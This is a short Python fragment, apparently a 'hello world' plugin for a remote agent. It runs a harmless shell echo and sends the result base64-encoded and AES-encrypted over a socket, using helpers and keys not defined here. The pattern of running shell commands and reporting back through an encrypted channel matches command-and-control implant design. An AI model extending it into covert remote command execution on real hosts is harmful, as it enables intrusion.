import os

class LinuxHelloWorld:
    def __init__(self, sock) -> None:
        self.sock = sock

    def say_hello(self):
        print('hello!')
        code = os.system('echo \'\'')
        return f'1|{code}'

    def run(self):
        payload = self.say_hello()
        payload = f'LinuxHelloWorld|{payload}'
        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))